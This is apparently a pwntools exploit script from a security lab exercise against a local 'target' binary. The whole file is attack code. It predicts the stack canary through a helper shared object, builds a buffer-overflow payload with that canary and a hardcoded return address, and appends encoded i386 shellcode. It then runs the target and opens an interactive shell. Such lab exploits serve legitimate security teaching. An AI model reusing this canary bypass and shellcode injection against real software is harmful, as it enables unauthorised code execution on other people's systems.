#gdb commands
#checksec


from pwn import *

context.update(arch='i386', os='linux')
context.terminal= [ "tmux","splitw","-h"]


shellcodeenv = b"\x31\xc9\x83\xe9\xf3\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x39\xbd\x8d\x3b\x83\xee\xfc\xe2\xf4\x53\xb6\xd5\xa2\x6b\xdb\xe5\x16\x5a\x34\x6a\x53\x16\xce\xe5\x3b\x51\x92\xef\x52\x57\x34\x6e\x69\xd1\xb2\x8d\x3b\x39\xde\xec\x4f\x19\x92\xfd\x49\x56\xde\xa2\x5d\x55\xdc\xea\x3b\x6e\xee\x04\xda\xf4\x3d\x8d\x3b"

so_file = "/tmp/treat/lab04/weak-random/exploit.so"
my_exploit = CDLL(so_file)

canary = my_exploit.get_canary()

payload = cyclic(cyclic_find(0x6361616f))
payload += p32(canary)
payload += b"AAAA"
payload += p32(0xf7de8b51)
payload += shellcodeenv

print(payload)


p = process(['./target',payload])

p.interactive()
